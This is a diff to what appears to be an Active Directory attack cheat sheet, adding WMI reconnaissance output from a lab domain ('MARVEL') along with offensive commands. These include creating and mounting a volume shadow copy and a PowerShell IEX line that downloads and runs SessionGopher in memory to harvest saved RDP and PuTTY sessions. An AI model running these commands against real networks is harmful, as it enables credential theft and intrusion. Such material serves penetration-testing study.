@@ -1,4 +1,4 @@
-# ADCheatSheet
+# Active Directory Attacks
 Active Directory Cheat Sheet
 
 #### LLMNR/NBT-NS poisoning 
@@ -358,8 +358,553 @@ References:
 https://docs.microsoft.com/pl-pl/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material?redirectedfrom=MSDN
 ```
 
-=========================
-#### Useful Powershell
+# Information Gathering WMIC
+
+```
+PS C:\Users\pparker> Get-WmiObject  -Class Win32_IP4RouteTable
+
+
+__GENUS          : 2
+__CLASS          : Win32_IP4RouteTable
+__SUPERCLASS     : CIM_LogicalElement
+__DYNASTY        : CIM_ManagedSystemElement
+__RELPATH        : Win32_IP4RouteTable.Destination="0.0.0.0",InterfaceIndex=13,Mask="0.0.0.0",NextHop="192.1
+                   68.22.2"
+__PROPERTY_COUNT : 18
+__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
+__SERVER         : SPIDERMAN
+__NAMESPACE      : root\cimv2
+__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="0.0.0.0",InterfaceIndex=13,Mask="
+                   0.0.0.0",NextHop="192.168.22.2"
+Age              : 14838
+Caption          : 0.0.0.0
+Description      : 0.0.0.0 - 0.0.0.0 - 192.168.22.2
+Destination      : 0.0.0.0
+Information      : 0.0
+InstallDate      :
+InterfaceIndex   : 13
+Mask             : 0.0.0.0
+Metric1          : 25
+Metric2          : -1
+Metric3          : -1
+Metric4          : -1
+Metric5          : -1
+Name             : 0.0.0.0
+NextHop          : 192.168.22.2
+Protocol         : 3
+Status           :
+Type             : 4
+PSComputerName   : SPIDERMAN
+
+__GENUS          : 2
+__CLASS          : Win32_IP4RouteTable
+__SUPERCLASS     : CIM_LogicalElement
+__DYNASTY        : CIM_ManagedSystemElement
+__RELPATH        : Win32_IP4RouteTable.Destination="127.0.0.0",InterfaceIndex=1,Mask="255.0.0.0",NextHop="0.
+                   0.0.0"
+__PROPERTY_COUNT : 18
+__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
+__SERVER         : SPIDERMAN
+__NAMESPACE      : root\cimv2
+__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="127.0.0.0",InterfaceIndex=1,Mask=
+                   "255.0.0.0",NextHop="0.0.0.0"
+Age              : 14844
+Caption          : 127.0.0.0
+Description      : 127.0.0.0 - 255.0.0.0 - 0.0.0.0
+Destination      : 127.0.0.0
+Information      : 0.0
+InstallDate      :
+InterfaceIndex   : 1
+Mask             : 255.0.0.0
+Metric1          : 331
+Metric2          : -1
+Metric3          : -1
+Metric4          : -1
+Metric5          : -1
+Name             : 127.0.0.0
+NextHop          : 0.0.0.0
+Protocol         : 2
+Status           :
+Type             : 3
+PSComputerName   : SPIDERMAN
+
+__GENUS          : 2
+__CLASS          : Win32_IP4RouteTable
+__SUPERCLASS     : CIM_LogicalElement
+__DYNASTY        : CIM_ManagedSystemElement
+__RELPATH        : Win32_IP4RouteTable.Destination="127.0.0.1",InterfaceIndex=1,Mask="255.255.255.255",NextH
+                   op="0.0.0.0"
+__PROPERTY_COUNT : 18
+__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
+__SERVER         : SPIDERMAN
+__NAMESPACE      : root\cimv2
+__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="127.0.0.1",InterfaceIndex=1,Mask=
+                   "255.255.255.255",NextHop="0.0.0.0"
+Age              : 14844
+Caption          : 127.0.0.1
+Description      : 127.0.0.1 - 255.255.255.255 - 0.0.0.0
+Destination      : 127.0.0.1
+Information      : 0.0
+InstallDate      :
+InterfaceIndex   : 1
+Mask             : 255.255.255.255
+Metric1          : 331
+Metric2          : -1
+Metric3          : -1
+Metric4          : -1
+Metric5          : -1
+Name             : 127.0.0.1
+NextHop          : 0.0.0.0
+Protocol         : 2
+Status           :
+Type             : 3
+PSComputerName   : SPIDERMAN
+
+__GENUS          : 2
+__CLASS          : Win32_IP4RouteTable
+__SUPERCLASS     : CIM_LogicalElement
+__DYNASTY        : CIM_ManagedSystemElement
+__RELPATH        : Win32_IP4RouteTable.Destination="127.255.255.255",InterfaceIndex=1,Mask="255.255.255.255"
+                   ,NextHop="0.0.0.0"
+__PROPERTY_COUNT : 18
+__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
+__SERVER         : SPIDERMAN
+__NAMESPACE      : root\cimv2
+__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="127.255.255.255",InterfaceIndex=1
+                   ,Mask="255.255.255.255",NextHop="0.0.0.0"
+Age              : 14844
+Caption          : 127.255.255.255
+Description      : 127.255.255.255 - 255.255.255.255 - 0.0.0.0
+Destination      : 127.255.255.255
+Information      : 0.0
+InstallDate      :
+InterfaceIndex   : 1
+Mask             : 255.255.255.255
+Metric1          : 331
+Metric2          : -1
+Metric3          : -1
+Metric4          : -1
+Metric5          : -1
+Name             : 127.255.255.255
+NextHop          : 0.0.0.0
+Protocol         : 2
+Status           :
+Type             : 3
+PSComputerName   : SPIDERMAN
+
+__GENUS          : 2
+__CLASS          : Win32_IP4RouteTable
+__SUPERCLASS     : CIM_LogicalElement
+__DYNASTY        : CIM_ManagedSystemElement
+__RELPATH        : Win32_IP4RouteTable.Destination="192.168.22.0",InterfaceIndex=13,Mask="255.255.255.0",Nex
+                   tHop="0.0.0.0"
+__PROPERTY_COUNT : 18
+__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
+__SERVER         : SPIDERMAN
+__NAMESPACE      : root\cimv2
+__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="192.168.22.0",InterfaceIndex=13,M
+                   ask="255.255.255.0",NextHop="0.0.0.0"
+Age              : 79
+Caption          : 192.168.22.0
+Description      : 192.168.22.0 - 255.255.255.0 - 0.0.0.0
+Destination      : 192.168.22.0
+Information      : 0.0
+InstallDate      :
+InterfaceIndex   : 13
+Mask             : 255.255.255.0
+Metric1          : 281
+Metric2          : -1
+Metric3          : -1
+Metric4          : -1
+Metric5          : -1
+Name             : 192.168.22.0
+NextHop          : 0.0.0.0
+Protocol         : 2
+Status           :
+Type             : 3
+PSComputerName   : SPIDERMAN
+
+__GENUS          : 2
+__CLASS          : Win32_IP4RouteTable
+__SUPERCLASS     : CIM_LogicalElement
+__DYNASTY        : CIM_ManagedSystemElement
+__RELPATH        : Win32_IP4RouteTable.Destination="192.168.22.212",InterfaceIndex=13,Mask="255.255.255.255"
+                   ,NextHop="0.0.0.0"
+__PROPERTY_COUNT : 18
+__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
+__SERVER         : SPIDERMAN
+__NAMESPACE      : root\cimv2
+__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="192.168.22.212",InterfaceIndex=13
+                   ,Mask="255.255.255.255",NextHop="0.0.0.0"
+Age              : 79
+Caption          : 192.168.22.212
+Description      : 192.168.22.212 - 255.255.255.255 - 0.0.0.0
+Destination      : 192.168.22.212
+Information      : 0.0
+InstallDate      :
+InterfaceIndex   : 13
+Mask             : 255.255.255.255
+Metric1          : 281
+Metric2          : -1
+Metric3          : -1
+Metric4          : -1
+Metric5          : -1
+Name             : 192.168.22.212
+NextHop          : 0.0.0.0
+Protocol         : 2
+Status           :
+Type             : 3
+PSComputerName   : SPIDERMAN
+
+__GENUS          : 2
+__CLASS          : Win32_IP4RouteTable
+__SUPERCLASS     : CIM_LogicalElement
+__DYNASTY        : CIM_ManagedSystemElement
+__RELPATH        : Win32_IP4RouteTable.Destination="192.168.22.255",InterfaceIndex=13,Mask="255.255.255.255"
+                   ,NextHop="0.0.0.0"
+__PROPERTY_COUNT : 18
+__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
+__SERVER         : SPIDERMAN
+__NAMESPACE      : root\cimv2
+__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="192.168.22.255",InterfaceIndex=13
+                   ,Mask="255.255.255.255",NextHop="0.0.0.0"
+Age              : 79
+Caption          : 192.168.22.255
+Description      : 192.168.22.255 - 255.255.255.255 - 0.0.0.0
+Destination      : 192.168.22.255
+Information      : 0.0
+InstallDate      :
+InterfaceIndex   : 13
+Mask             : 255.255.255.255
+Metric1          : 281
+Metric2          : -1
+Metric3          : -1
+Metric4          : -1
+Metric5          : -1
+Name             : 192.168.22.255
+NextHop          : 0.0.0.0
+Protocol         : 2
+Status           :
+Type             : 3
+PSComputerName   : SPIDERMAN
+
+__GENUS          : 2
+__CLASS          : Win32_IP4RouteTable
+__SUPERCLASS     : CIM_LogicalElement
+__DYNASTY        : CIM_ManagedSystemElement
+__RELPATH        : Win32_IP4RouteTable.Destination="224.0.0.0",InterfaceIndex=1,Mask="240.0.0.0",NextHop="0.
+                   0.0.0"
+__PROPERTY_COUNT : 18
+__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
+__SERVER         : SPIDERMAN
+__NAMESPACE      : root\cimv2
+__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="224.0.0.0",InterfaceIndex=1,Mask=
+                   "240.0.0.0",NextHop="0.0.0.0"
+Age              : 14844
+Caption          : 224.0.0.0
+Description      : 224.0.0.0 - 240.0.0.0 - 0.0.0.0
+Destination      : 224.0.0.0
+Information      : 0.0
+InstallDate      :
+InterfaceIndex   : 1
+Mask             : 240.0.0.0
+Metric1          : 331
+Metric2          : -1
+Metric3          : -1
+Metric4          : -1
+Metric5          : -1
+Name             : 224.0.0.0
+NextHop          : 0.0.0.0
+Protocol         : 2
+Status           :
+Type             : 3
+PSComputerName   : SPIDERMAN
+
+__GENUS          : 2
+__CLASS          : Win32_IP4RouteTable
+__SUPERCLASS     : CIM_LogicalElement
+__DYNASTY        : CIM_ManagedSystemElement
+__RELPATH        : Win32_IP4RouteTable.Destination="224.0.0.0",InterfaceIndex=13,Mask="240.0.0.0",NextHop="0
+                   .0.0.0"
+__PROPERTY_COUNT : 18
+__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
+__SERVER         : SPIDERMAN
+__NAMESPACE      : root\cimv2
+__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="224.0.0.0",InterfaceIndex=13,Mask
+                   ="240.0.0.0",NextHop="0.0.0.0"
+Age              : 14842
+Caption          : 224.0.0.0
+Description      : 224.0.0.0 - 240.0.0.0 - 0.0.0.0
+Destination      : 224.0.0.0
+Information      : 0.0
+InstallDate      :
+InterfaceIndex   : 13
+Mask             : 240.0.0.0
+Metric1          : 281
+Metric2          : -1
+Metric3          : -1
+Metric4          : -1
+Metric5          : -1
+Name             : 224.0.0.0
+NextHop          : 0.0.0.0
+Protocol         : 2
+Status           :
+Type             : 3
+PSComputerName   : SPIDERMAN
+
+__GENUS          : 2
+__CLASS          : Win32_IP4RouteTable
+__SUPERCLASS     : CIM_LogicalElement
+__DYNASTY        : CIM_ManagedSystemElement
+__RELPATH        : Win32_IP4RouteTable.Destination="255.255.255.255",InterfaceIndex=1,Mask="255.255.255.255"
+                   ,NextHop="0.0.0.0"
+__PROPERTY_COUNT : 18
+__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
+__SERVER         : SPIDERMAN
+__NAMESPACE      : root\cimv2
+__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="255.255.255.255",InterfaceIndex=1
+                   ,Mask="255.255.255.255",NextHop="0.0.0.0"
+Age              : 14844
+Caption          : 255.255.255.255
+Description      : 255.255.255.255 - 255.255.255.255 - 0.0.0.0
+Destination      : 255.255.255.255
+Information      : 0.0
+InstallDate      :
+InterfaceIndex   : 1
+Mask             : 255.255.255.255
+Metric1          : 331
+Metric2          : -1
+Metric3          : -1
+Metric4          : -1
+Metric5          : -1
+Name             : 255.255.255.255
+NextHop          : 0.0.0.0
+Protocol         : 2
+Status           :
+Type             : 3
+PSComputerName   : SPIDERMAN
+
+__GENUS          : 2
+__CLASS          : Win32_IP4RouteTable
+__SUPERCLASS     : CIM_LogicalElement
+__DYNASTY        : CIM_ManagedSystemElement
+__RELPATH        : Win32_IP4RouteTable.Destination="255.255.255.255",InterfaceIndex=13,Mask="255.255.255.255
+                   ",NextHop="0.0.0.0"
+__PROPERTY_COUNT : 18
+__DERIVATION     : {CIM_LogicalElement, CIM_ManagedSystemElement}
+__SERVER         : SPIDERMAN
+__NAMESPACE      : root\cimv2
+__PATH           : \\SPIDERMAN\root\cimv2:Win32_IP4RouteTable.Destination="255.255.255.255",InterfaceIndex=1
+                   3,Mask="255.255.255.255",NextHop="0.0.0.0"
+Age              : 14842
+Caption          : 255.255.255.255
+Description      : 255.255.255.255 - 255.255.255.255 - 0.0.0.0
+Destination      : 255.255.255.255
+Information      : 0.0
+InstallDate      :
+InterfaceIndex   : 13
+Mask             : 255.255.255.255
+Metric1          : 281
+Metric2          : -1
+Metric3          : -1
+Metric4          : -1
+Metric5          : -1
+Name             : 255.255.255.255
+NextHop          : 0.0.0.0
+Protocol         : 2
+Status           :
+Type             : 3
+PSComputerName   : SPIDERMAN
+```
+
+
+Enumerate user in Domain and Trusted domain
+```
+PS C:\Users\pparker> Get-WmiObject -Class  Win32_USerAccount
+
+
+AccountType : 512
+Caption     : SPIDERMAN\Administrator
+Domain      : SPIDERMAN
+SID         : S-1-5-21-1600661046-3385568014-3685991882-500
+FullName    :
+Name        : Administrator
+
+AccountType : 512
+Caption     : SPIDERMAN\DefaultAccount
+Domain      : SPIDERMAN
+SID         : S-1-5-21-1600661046-3385568014-3685991882-503
+FullName    :
+Name        : DefaultAccount
+
+AccountType : 512
+Caption     : SPIDERMAN\Guest
+Domain      : SPIDERMAN
+SID         : S-1-5-21-1600661046-3385568014-3685991882-501
+FullName    :
+Name        : Guest
+
+AccountType : 512
+Caption     : SPIDERMAN\Peter
+Domain      : SPIDERMAN
+SID         : S-1-5-21-1600661046-3385568014-3685991882-1001
+FullName    :
+Name        : Peter
+
+AccountType : 512
+Caption     : SPIDERMAN\WDAGUtilityAccount
+Domain      : SPIDERMAN
+SID         : S-1-5-21-1600661046-3385568014-3685991882-504
+FullName    :
+Name        : WDAGUtilityAccount
+
+AccountType : 512
+Caption     : MARVEL\Administrator
+Domain      : MARVEL
+SID         : S-1-5-21-1806573636-3987246654-2051155295-500
+FullName    :
+Name        : Administrator
+
+AccountType : 512
+Caption     : MARVEL\Guest
+Domain      : MARVEL
+SID         : S-1-5-21-1806573636-3987246654-2051155295-501
+FullName    :
+Name        : Guest
+
+AccountType : 512
+Caption     : MARVEL\krbtgt
+Domain      : MARVEL
+SID         : S-1-5-21-1806573636-3987246654-2051155295-502
+FullName    :
+Name        : krbtgt
+
+AccountType : 512
+Caption     : MARVEL\DefaultAccount
+Domain      : MARVEL
+SID         : S-1-5-21-1806573636-3987246654-2051155295-503
+FullName    :
+Name        : DefaultAccount
+
+AccountType : 512
+Caption     : MARVEL\fcastle
+Domain      : MARVEL
+SID         : S-1-5-21-1806573636-3987246654-2051155295-1103
+FullName    : Frank Castle
+Name        : fcastle
+
+AccountType : 512
+Caption     : MARVEL\pparker
+Domain      : MARVEL
+SID         : S-1-5-21-1806573636-3987246654-2051155295-1105
+FullName    : Peter Parker
+Name        : pparker
+
+AccountType : 512
+Caption     : MARVEL\spn1
+Domain      : MARVEL
+SID         : S-1-5-21-1806573636-3987246654-2051155295-1109
+FullName    :
+Name        : spn1
+
+```
+
+
+Enumerate groups in Domain and Trusted Domains
+```
+PS C:\Users\pparker> Get-WmiObject -Class Win32_Group
+Caption                                        Domain    Name                                    SID
+-------                                        ------    ----                                    ---
+SPIDERMAN\Access Control Assistance Operators  SPIDERMAN Access Control Assistance Operators     S-1-5-32-579
+SPIDERMAN\Administrators                       SPIDERMAN Administrators                          S-1-5-32-544
+SPIDERMAN\Backup Operators                     SPIDERMAN Backup Operators                        S-1-5-32-551
+SPIDERMAN\Cryptographic Operators              SPIDERMAN Cryptographic Operators                 S-1-5-32-569
+SPIDERMAN\Device Owners                        SPIDERMAN Device Owners                           S-1-5-32-583
+SPIDERMAN\Distributed COM Users                SPIDERMAN Distributed COM Users                   S-1-5-32-562
+SPIDERMAN\Event Log Readers                    SPIDERMAN Event Log Readers                       S-1-5-32-573
+SPIDERMAN\Guests                               SPIDERMAN Guests                                  S-1-5-32-546
+SPIDERMAN\Hyper-V Administrators               SPIDERMAN Hyper-V Administrators                  S-1-5-32-578
+SPIDERMAN\IIS_IUSRS                            SPIDERMAN IIS_IUSRS                               S-1-5-32-568
+SPIDERMAN\Network Configuration Operators      SPIDERMAN Network Configuration Operators         S-1-5-32-556
+SPIDERMAN\Performance Log Users                SPIDERMAN Performance Log Users                   S-1-5-32-559
+SPIDERMAN\Performance Monitor Users            SPIDERMAN Performance Monitor Users               S-1-5-32-558
+SPIDERMAN\Power Users                          SPIDERMAN Power Users                             S-1-5-32-547
+SPIDERMAN\Remote Desktop Users                 SPIDERMAN Remote Desktop Users                    S-1-5-32-555
+SPIDERMAN\Remote Management Users              SPIDERMAN Remote Management Users                 S-1-5-32-580
+SPIDERMAN\Replicator                           SPIDERMAN Replicator                              S-1-5-32-552
+SPIDERMAN\System Managed Accounts Group        SPIDERMAN System Managed Accounts Group           S-1-5-32-581
+SPIDERMAN\Users                                SPIDERMAN Users                                   S-1-5-32-545
+MARVEL\Cert Publishers                         MARVEL    Cert Publishers                         S-1-5-21-1...
+MARVEL\RAS and IAS Servers                     MARVEL    RAS and IAS Servers                     S-1-5-21-1...
+MARVEL\Allowed RODC Password Replication Group MARVEL    Allowed RODC Password Replication Group S-1-5-21-1...
+MARVEL\Denied RODC Password Replication Group  MARVEL    Denied RODC Password Replication Group  S-1-5-21-1...
+MARVEL\DnsAdmins                               MARVEL    DnsAdmins                               S-1-5-21-1...
+MARVEL\Cloneable Domain Controllers            MARVEL    Cloneable Domain Controllers            S-1-5-21-1...
+MARVEL\DnsUpdateProxy                          MARVEL    DnsUpdateProxy                          S-1-5-21-1...
+MARVEL\Domain Admins                           MARVEL    Domain Admins                           S-1-5-21-1...
+MARVEL\Domain Computers                        MARVEL    Domain Computers                        S-1-5-21-1...
+MARVEL\Domain Controllers                      MARVEL    Domain Controllers                      S-1-5-21-1...
+MARVEL\Domain Guests                           MARVEL    Domain Guests                           S-1-5-21-1...
+MARVEL\Domain Users                            MARVEL    Domain Users                            S-1-5-21-1...
+MARVEL\Enterprise Admins                       MARVEL    Enterprise Admins                       S-1-5-21-1...
+MARVEL\Enterprise Key Admins                   MARVEL    Enterprise Key Admins                   S-1-5-21-1...
+MARVEL\Enterprise Read-only Domain Controllers MARVEL    Enterprise Read-only Domain Controllers S-1-5-21-1...
+MARVEL\Group Policy Creator Owners             MARVEL    Group Policy Creator Owners             S-1-5-21-1...
+MARVEL\Key Admins                              MARVEL    Key Admins                              S-1-5-21-1...
+MARVEL\Protected Users                         MARVEL    Protected Users                         S-1-5-21-1...
+MARVEL\Read-only Domain Controllers            MARVEL    Read-only Domain Controllers            S-1-5-21-1...
+MARVEL\Schema Admins                           MARVEL    Schema Admins                           S-1-5-21-1...
+```
+
+```
+PS C:\Windows\system32> (Get-WmiObject -Class Win32_Shadowcopy -list).create("C:\", "ClientAccessible")
+
+
+__GENUS          : 2
+__CLASS          : __PARAMETERS
+__SUPERCLASS     :
+__DYNASTY        : __PARAMETERS
+__RELPATH        :
+__PROPERTY_COUNT : 2
+__DERIVATION     : {}
+__SERVER         :
+__NAMESPACE      :
+__PATH           :
+ReturnValue      : 0
+ShadowID         : {637B9468-E33A-4F4E-8E30-7B374BC2E40B}
+PSComputerName   :
+
+
+
+PS C:\Windows\system32> $link = (Get-WmiObject -Class Win32_Shadowcopy).DeviceObject + "\"
+PS C:\Windows\system32> cmd /c mklink /d C:\shadowcopy "$link"
+symbolic link created for C:\shadowcopy <<===>> \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
+PS C:\Windows\system32>
+
+```
+
+Extract RDP, Putty sessions form Registry:
+
+```
+PS C:\Users\pparker> IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1'); Invoke-SessionGopher                                         
+          o_
+         /  ".   SessionGopher
+       ,"  _-"
+     ,"   m m
+  ..+     )      Brandon Arvanaghi
+     `m..m       Twitter: @arvanaghi | arvanaghi.com
+
+[+] Digging on Spiderman ...
+Microsoft Remote Desktop (RDP) Sessions
+
+
+Source   : Spiderman\pparker
+Hostname : 192.168.22.211
+Username : MARVEL\Administrator
+
+```
+
+# Useful Powershell
 
 Looking for SPN's (works only with activedirectory module)
 ```
